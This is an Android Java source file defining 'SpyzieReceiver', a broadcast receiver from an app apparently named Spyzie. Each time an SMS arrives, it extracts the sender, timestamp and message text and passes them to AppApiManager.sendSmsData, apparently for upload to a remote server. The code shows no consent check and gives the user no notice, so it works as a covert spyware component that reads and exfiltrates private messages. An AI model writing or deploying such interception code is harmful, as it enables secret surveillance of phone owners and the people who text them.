package com.tantd.spyzie.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.network.AppApiManager;
import com.tantd.spyzie.util.Constants;

import java.util.Date;

public class SpyzieReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        StringBuilder sb = new StringBuilder();
        SmsMessage smsMessage;
        Sms sms = new Sms();
        for (int i = 0; i < pdus.length; i++) {
            smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
            if (i == 0) {
                sms.sender = smsMessage.getDisplayOriginatingAddress();
                sms.time = smsMessage.getTimestampMillis();
                sb.append("Phone: " + sms.sender);
            }
            sb.append(", Message: " + smsMessage.getMessageBody());
        }
        sms.content = sb.toString();
        AppApiManager.getInstance().sendSmsData(sms);
    }
}
